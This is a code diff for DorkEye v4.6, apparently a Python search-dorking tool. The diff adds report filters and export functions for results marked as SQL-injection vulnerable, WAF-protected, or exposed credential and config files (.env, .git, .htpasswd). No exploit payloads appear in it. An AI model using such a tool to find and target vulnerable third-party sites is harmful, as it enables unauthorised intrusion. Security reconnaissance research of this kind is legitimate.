+  "doc-ppt":(r)=>[".ppt",".pptx"].includes(r.dataset.ext),
+  "doc-arc":(r)=>[".zip",".rar",".tar",".gz",".7z",".bz2"].includes(r.dataset.ext),
+  "sqli-all":(r)=>["vuln","safe","critical"].includes(r.dataset.sqli),
+  "sqli-critical":(r)=>r.dataset.sqli==="critical",
+  "sqli-vuln":(r)=>["vuln","critical"].includes(r.dataset.sqli),
+  "sqli-safe":(r)=>r.dataset.sqli==="safe",
+  "scripts-all":()=>true,
+  "scripts-php":(r)=>r.dataset.ext===".php",
+  "scripts-asp":(r)=>[".asp",".aspx"].includes(r.dataset.ext),
+  "scripts-sh":(r)=>[".sh",".bat",".ps1"].includes(r.dataset.ext),
+  "scripts-config":(r)=>[".conf",".config",".ini",".yaml",".yml",".json",".xml"].includes(r.dataset.ext),
+  "scripts-creds":(r)=>[".env",".git",".svn",".htpasswd"].includes(r.dataset.ext)
+}};
 let activeGroup="all",activeSub=null;
-function closeAllSubMenus(){document.querySelectorAll('.sub-menu.open').forEach(m=>{m.classList.remove('open');m.style.maxHeight='0';m.style.opacity='0';});document.querySelectorAll('.filter-btn.has-sub').forEach(b=>b.classList.remove('active'));}
-function toggleSubMenu(g){const m=document.getElementById('sub-'+g);if(!m)return;const o=m.classList.contains('open');closeAllSubMenus();if(!o){m.classList.add('open');m.style.maxHeight='300px';m.style.opacity='1';}}
-function applyFilter(btn){const group=btn.dataset.group;if(btn.classList.contains('has-sub')){if(activeGroup===group){toggleSubMenu(group);return;}activeGroup=group;activeSub=group+'-all';document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');const menu=document.getElementById('sub-'+group);if(menu){menu.querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));menu.querySelector('.sub-btn').classList.add('active');}toggleSubMenu(group);}else{closeAllSubMenus();document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');activeGroup=group;activeSub=null;}renderRows();updateInfoBar();}
-function applySubFilter(btn,groupId){btn.closest('.sub-menu').querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');activeSub=btn.dataset.sub;renderRows();updateInfoBar();}
-function renderRows(){const rows=document.querySelectorAll('#results-tbody tr');const pred=activeSub?(SUB_PRED[activeSub]||(()=>true)):(()=>true);rows.forEach(row=>{if(activeGroup==='all'){row.classList.remove('hidden');return;}if(activeGroup==='sqli'){if(pred(row))row.classList.remove('hidden');else row.classList.add('hidden');return;}const cats=GROUP_CATS[activeGroup]||[];const inGroup=cats.includes(row.dataset.category||'');if(inGroup&&pred(row))row.classList.remove('hidden');else row.classList.add('hidden');});}
-function buildSubBadges(){const rows=Array.from(document.querySelectorAll('#results-tbody tr'));const inGroup=cats=>(row)=>cats.includes(row.dataset.category||'');const docRows=rows.filter(inGroup(GROUP_CATS['doc']));const sqliRows=rows.filter(r=>r.dataset.sqli==="vuln"||r.dataset.sqli==="safe");const scriptsRows=rows.filter(inGroup(GROUP_CATS['scripts']));const set=(id,n)=>{const el=document.getElementById(id);if(el)el.textContent=n;};set('sbadge-doc-all',docRows.length);set('sbadge-doc-pdf',docRows.filter(r=>r.dataset.ext==='.pdf').length);set('sbadge-doc-docx',docRows.filter(r=>['.doc','.docx','.odt'].includes(r.dataset.ext)).length);set('sbadge-doc-xlsx',docRows.filter(r=>['.xls','.xlsx','.ods'].includes(r.dataset.ext)).length);set('sbadge-doc-ppt',docRows.filter(r=>['.ppt','.pptx'].includes(r.dataset.ext)).length);set('sbadge-doc-arc',docRows.filter(r=>['.zip','.rar','.tar','.gz','.7z','.bz2'].includes(r.dataset.ext)).length);set('sbadge-sqli-all',sqliRows.length);set('sbadge-sqli-vuln',sqliRows.filter(r=>r.dataset.sqli==='vuln').length);set('sbadge-sqli-safe',sqliRows.filter(r=>r.dataset.sqli==='safe').length);set('sbadge-scripts-all',scriptsRows.length);set('sbadge-scripts-php',scriptsRows.filter(r=>r.dataset.ext==='.php').length);set('sbadge-scripts-asp',scriptsRows.filter(r=>['.asp','.aspx'].includes(r.dataset.ext)).length);set('sbadge-scripts-sh',scriptsRows.filter(r=>['.sh','.bat','.ps1'].includes(r.dataset.ext)).length);set('sbadge-scripts-config',scriptsRows.filter(r=>['.conf','.config','.ini','.yaml','.yml','.json','.xml'].includes(r.dataset.ext)).length);set('sbadge-scripts-creds',scriptsRows.filter(r=>['.env','.git','.svn','.htpasswd'].includes(r.dataset.ext)).length);}
-function updateInfoBar(){const bar=document.getElementById('sub-info');if(!bar)return;const visible=document.querySelectorAll('#results-tbody tr:not(.hidden)').length;if(activeGroup==='all'||!activeSub){bar.innerHTML=`&#10142; Showing <span>${visible}</span> result(s)`;}else{const subLabel=activeSub.split('-').slice(1).join(' ').toUpperCase();const grpLabel=activeGroup.toUpperCase();bar.innerHTML=`&#10142; Filter: <span>${grpLabel}</span> &rsaquo; <span>${subLabel}</span> &mdash; <span>${visible}</span> result(s) visible`;}}
-document.addEventListener('click',(e)=>{if(!e.target.closest('.filter-group')&&!e.target.closest('.filter-btn[data-group]')){closeAllSubMenus();document.querySelectorAll('.filter-btn').forEach(b=>{if(b.dataset.group===activeGroup)b.classList.add('active');});}});
-buildSubBadges();updateInfoBar();
+function closeAllSubMenus(){{document.querySelectorAll('.sub-menu.open').forEach(m=>{{m.classList.remove('open');m.style.maxHeight='0';m.style.opacity='0';}});document.querySelectorAll('.filter-btn.has-sub').forEach(b=>b.classList.remove('active'));}}
+function toggleSubMenu(g){{const m=document.getElementById('sub-'+g);if(!m)return;const o=m.classList.contains('open');closeAllSubMenus();if(!o){{m.classList.add('open');m.style.maxHeight='300px';m.style.opacity='1';}}}}
+function applyFilter(btn){{
+  const group=btn.dataset.group;
+  if(btn.classList.contains('has-sub')){{
+    if(activeGroup===group){{toggleSubMenu(group);return;}}
+    activeGroup=group;activeSub=group+'-all';
+    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    const menu=document.getElementById('sub-'+group);
+    if(menu){{menu.querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));menu.querySelector('.sub-btn').classList.add('active');}}
+    toggleSubMenu(group);
+  }}else{{
+    closeAllSubMenus();
+    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');activeGroup=group;activeSub=null;
+  }}
+  renderRows();updateInfoBar();updateExportCounts();
+}}
+function applySubFilter(btn,groupId){{
+  btn.closest('.sub-menu').querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');activeSub=btn.dataset.sub;
+  renderRows();updateInfoBar();updateExportCounts();
+}}
+function renderRows(){{
+  const rows=document.querySelectorAll('#results-tbody tr');
+  const pred=activeSub?(SUB_PRED[activeSub]||(()=>true)):(()=>true);
+  rows.forEach(row=>{{
+    if(activeGroup==='all'){{row.classList.remove('hidden');return;}}
+    if(activeGroup==='sqli'){{pred(row)?row.classList.remove('hidden'):row.classList.add('hidden');return;}}
+    const cats=GROUP_CATS[activeGroup]||[];
+    const inGroup=cats.includes(row.dataset.category||'');
+    (inGroup&&pred(row))?row.classList.remove('hidden'):row.classList.add('hidden');
+  }});
+}}
+function buildSubBadges(){{
+  const rows=Array.from(document.querySelectorAll('#results-tbody tr'));
+  const inGroup=cats=>(row)=>cats.includes(row.dataset.category||'');
+  const docRows=rows.filter(inGroup(GROUP_CATS['doc']));
+  const sqliRows=rows.filter(r=>["vuln","safe","critical"].includes(r.dataset.sqli));
+  const scriptsRows=rows.filter(inGroup(GROUP_CATS['scripts']));
+  const set=(id,n)=>{{const el=document.getElementById(id);if(el)el.textContent=n;}};
+  set('sbadge-doc-all',docRows.length);
+  set('sbadge-doc-pdf',docRows.filter(r=>r.dataset.ext==='.pdf').length);
+  set('sbadge-doc-docx',docRows.filter(r=>['.doc','.docx','.odt'].includes(r.dataset.ext)).length);
+  set('sbadge-doc-xlsx',docRows.filter(r=>['.xls','.xlsx','.ods'].includes(r.dataset.ext)).length);
+  set('sbadge-doc-ppt',docRows.filter(r=>['.ppt','.pptx'].includes(r.dataset.ext)).length);
+  set('sbadge-doc-arc',docRows.filter(r=>['.zip','.rar','.tar','.gz','.7z','.bz2'].includes(r.dataset.ext)).length);
+  set('sbadge-sqli-all',sqliRows.length);
+  set('sbadge-sqli-critical',sqliRows.filter(r=>r.dataset.sqli==='critical').length);
+  set('sbadge-sqli-vuln',sqliRows.filter(r=>['vuln','critical'].includes(r.dataset.sqli)).length);
+  set('sbadge-sqli-safe',sqliRows.filter(r=>r.dataset.sqli==='safe').length);
+  set('sbadge-scripts-all',scriptsRows.length);
+  set('sbadge-scripts-php',scriptsRows.filter(r=>r.dataset.ext==='.php').length);
+  set('sbadge-scripts-asp',scriptsRows.filter(r=>['.asp','.aspx'].includes(r.dataset.ext)).length);
+  set('sbadge-scripts-sh',scriptsRows.filter(r=>['.sh','.bat','.ps1'].includes(r.dataset.ext)).length);
+  set('sbadge-scripts-config',scriptsRows.filter(r=>['.conf','.config','.ini','.yaml','.yml','.json','.xml'].includes(r.dataset.ext)).length);
+  set('sbadge-scripts-creds',scriptsRows.filter(r=>['.env','.git','.svn','.htpasswd'].includes(r.dataset.ext)).length);
+}}
+function updateInfoBar(){{
+  const bar=document.getElementById('sub-info');if(!bar)return;
+  const visible=document.querySelectorAll('#results-tbody tr:not(.hidden)').length;
+  if(activeGroup==='all'||!activeSub){{
+    bar.innerHTML=`&#10142; Showing <span>${{visible}}</span> result(s)`;
+  }}else{{
+    const subLabel=activeSub.split('-').slice(1).join(' ').toUpperCase();
+    const grpLabel=activeGroup.toUpperCase();
+    bar.innerHTML=`&#10142; Filter: <span>${{grpLabel}}</span> &rsaquo; <span>${{subLabel}}</span> &mdash; <span>${{visible}}</span> result(s) visible`;
+  }}
+}}
+document.addEventListener('click',(e)=>{{
+  if(!e.target.closest('.filter-group')&&!e.target.closest('.filter-btn[data-group]')){{
+    closeAllSubMenus();
+    document.querySelectorAll('.filter-btn').forEach(b=>{{if(b.dataset.group===activeGroup)b.classList.add('active');}});
+  }}
+  if(!e.target.closest('#exportWrap'))closeExportPanel();
+}});
+
+/* ═══════════════════════════════════════════════
+   Export panel
+═══════════════════════════════════════════════ */
+function toggleExportPanel(){{
+  const panel=document.getElementById('exportPanel');
+  const toggle=document.getElementById('exportToggle');
+  const open=panel.classList.contains('open');
+  if(open){{panel.classList.remove('open');toggle.classList.remove('open');}}
+  else{{panel.classList.add('open');toggle.classList.add('open');updateExportCounts();closeAllSubMenus();}}
+}}
+function closeExportPanel(){{
+  document.getElementById('exportPanel').classList.remove('open');
+  document.getElementById('exportToggle').classList.remove('open');
+}}
+
+function updateExportCounts(){{
+  const sqliAll  = EXPORT_DATA.filter(r=>['vuln','safe','critical'].includes(r.sqli));
+  const sqliVuln = EXPORT_DATA.filter(r=>['vuln','critical'].includes(r.sqli));
+  const sqliSafe = EXPORT_DATA.filter(r=>r.sqli==='safe');
+  const viewRows = Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden)'));
+  const viewIdxs = new Set(viewRows.map(r=>parseInt(r.dataset.idx)));
+  const viewData = EXPORT_DATA.filter((_,i)=>viewIdxs.has(i));
+  const s=(id,n,label)=>{{const el=document.getElementById(id);if(el)el.textContent=`(${{n}})`;}}; 
+  s('epCntSqliAll', sqliAll.length);
+  s('epCntSqliVuln',sqliVuln.length);
+  s('epCntSqliSafe',sqliSafe.length);
+  s('epCntView',    viewData.length);
+}}
+
+function _getRows(scope){{
+  if(scope==='all')       return EXPORT_DATA;
+  if(scope==='sqli-all')  return EXPORT_DATA.filter(r=>['vuln','safe','critical'].includes(r.sqli));
+  if(scope==='sqli-vuln') return EXPORT_DATA.filter(r=>['vuln','critical'].includes(r.sqli));
+  if(scope==='sqli-safe') return EXPORT_DATA.filter(r=>r.sqli==='safe');
+  if(scope==='view'){{
+    const viewIdxs=new Set(Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden)')).map(r=>parseInt(r.dataset.idx)));
+    return EXPORT_DATA.filter((_,i)=>viewIdxs.has(i));
+  }}
+  return EXPORT_DATA;
+}}
+
+function _scopeLabel(scope){{
+  return {{
+    'all':'all','sqli-all':'sqli_tested','sqli-vuln':'sqli_vuln',
+    'sqli-safe':'sqli_safe','view':'view'
+  }}[scope]||scope;
+}}
+
+function _download(content, filename, mime){{
+  const blob=new Blob([content],{{type:mime}});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download=filename;
+  document.body.appendChild(a);a.click();
+  setTimeout(()=>{{URL.revokeObjectURL(a.href);document.body.removeChild(a);}},100);
+}}
+
+function _showToast(msg){{
+  const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2200);
+}}
+
+function doExport(fmt, scope){{
+  const rows=_getRows(scope);
+  if(!rows.length){{_showToast('No results to export for this filter.');return;}}
+  const ts=new Date().toISOString().slice(0,19).replace(/[:T]/g,'-');
+  const base=`${{REPORT_BASE}}_${{_scopeLabel(scope)}}_${{ts}}`;
+
+  if(fmt==='txt'){{
+    const lines=rows.map((r,i)=>{{
+      let s=`${{i+1}}. ${{r.url}}\\n`;
+      if(r.title) s+=`   Title    : ${{r.title}}\\n`;
+      if(r.category) s+=`   Category : ${{r.category}}\\n`;
+      if(r.dork)  s+=`   Dork     : ${{r.dork}}\\n`;
+      if(r.sqli&&r.sqli!=='untested') s+=`   SQLi     : ${{r.sqli.toUpperCase()}}${{r.conf?' ('+r.conf+')':''}}\\n`;
+      if(r.waf)   s+=`   WAF      : ${{r.waf}}\\n`;
+      s+=`   Time     : ${{r.timestamp}}\\n`;
+      return s;
+    }});
+    _download('DorkEye Export — '+scope.toUpperCase()+'\\nGenerated: '+ts+'\\nTotal: '+rows.length+'\\n\\n'+lines.join('\\n'), base+'.txt', 'text/plain');
+    _showToast(`Exported ${{rows.length}} rows → ${{base}}.txt`);
+  }}
+
+  else if(fmt==='json'){{
+    const payload={{
+      meta:{{generated:ts,scope:scope,total:rows.length,report:REPORT_BASE}},
+      results:rows
+    }};
+    _download(JSON.stringify(payload,null,2), base+'.json', 'application/json');
+    _showToast(`Exported ${{rows.length}} rows → ${{base}}.json`);
+  }}
+
+  else if(fmt==='csv'){{
+    const headers=['url','title','dork','category','ext','sqli','conf','waf','timestamp'];
+    const esc=v=>{{const s=String(v??'');return s.includes(',')||s.includes('"')||s.includes('\\n')?'"'+s.replace(/"/g,'""')+'"':s;}};
+    const csvLines=[headers.join(','),...rows.map(r=>headers.map(h=>esc(r[h]||'')).join(','))];
+    _download(csvLines.join('\\r\\n'), base+'.csv', 'text/csv');
+    _showToast(`Exported ${{rows.length}} rows → ${{base}}.csv`);
+  }}
+}}
+
+/* ═══════════════════════════════════════════════
+   Init
+═══════════════════════════════════════════════ */
+buildSubBadges();updateInfoBar();updateExportCounts();
 </script>
 </body>
 </html>"""
@@ -1815,6 +2616,7 @@ buildSubBadges();updateInfoBar();
         table.add_row("├─> Blacklisted",         str(self.stats.get("blacklisted", 0)))
         if self.config.get("sqli_detection", False):
             table.add_row("├─> SQLi Vulnerabilities", f"[bold red]{self.stats.get('sqli_vulnerable', 0)}[/bold red]")
+            table.add_row("├─> WAF Detected",          f"[bold yellow]{self.stats.get('waf_detected', 0)}[/bold yellow]")
         table.add_row("└─> Execution Time", f"{round(time.time() - self.start_time, 2)}s")
         console.print(table)
         categories = {k.replace("category_", ""): v for k, v in self.stats.items() if k.startswith("category_")}
@@ -2186,7 +2988,7 @@ def main():
     greet_user()
 
     parser = argparse.ArgumentParser(
-        description="DorkEye v4.5 | OSINT Dorking Tool",
+        description="DorkEye v4.6 | OSINT Dorking Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""Examples:
 
@@ -2273,7 +3075,15 @@ def main():
     if args.blacklist:      config["blacklist"]            = args.blacklist
     if args.whitelist:      config["whitelist"]            = args.whitelist
 
-    dorkeye = DorkEyeEnhanced(config, args.output)
+    # Default output: report_YYYYMMDD_HHMMSS.html when -o is not specified
+    output_file = args.output
+    if not output_file:
+        output_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+        console.print(
+            f"[dim][~] No -o specified — saving to [bold]{output_file}[/bold][/dim]"
+        )
+
+    dorkeye = DorkEyeEnhanced(config, output_file)
 
     if args.dg:
         template_files = resolve_templates_argument(args.templates)
@@ -2299,8 +3109,7 @@ def main():
 
     dorkeye.print_statistics()
 
-    if args.output:
-        console.print(f"\n[bold green][✓] Results saved: {args.output}[/bold green]")
+    console.print(f"\n[bold green][✓] Results saved → Dump/{output_file}[/bold green]")
 
 
 if __name__ == "__main__":
